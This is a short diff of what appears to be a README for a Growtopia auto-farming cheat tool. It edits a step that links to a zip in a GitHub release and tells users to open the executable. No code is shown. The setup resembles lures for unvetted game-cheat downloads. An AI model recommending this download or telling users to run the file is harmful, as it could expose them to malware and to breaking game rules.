@@ -18,7 +18,7 @@ _________________________________________________________________________
 _________________________________________________________________________
 **ℍ𝕠𝕨 𝕥𝕠 𝕦𝕤𝕖 ? [𝕖𝕩𝕖]**
 
-1. ᴅᴏᴡɴʟᴏᴀᴅ ᴀᴜᴛᴏᴄʟɪᴄᴋᴇʀꜱ.ᴇxᴇ [ᴄʟɪᴄᴋ ʜᴇʀᴇ](https://github.com/ZaresPlusX/GrowTopia-AutoFarmer/releases/download/1.7.6/GT.Auto-CCS.by.RealGoblins.zip)
+1. ᴅᴏᴡɴʟᴏᴀᴅ GT Auto-CCS by RealGoblins.zip [ᴄʟɪᴄᴋ ʜᴇʀᴇ](https://github.com/ZaresPlusX/GrowTopia-AutoFarmer/releases/download/1.7.6/GT.Auto-CCS.by.RealGoblins.zip)
 2. ᴏᴘᴇɴ ᴇxᴇ ᴀɴᴅ ᴇɴᴊᴏʏ
 
 **🆃🆄🆃🅾🆁🅸🅰🅻:**
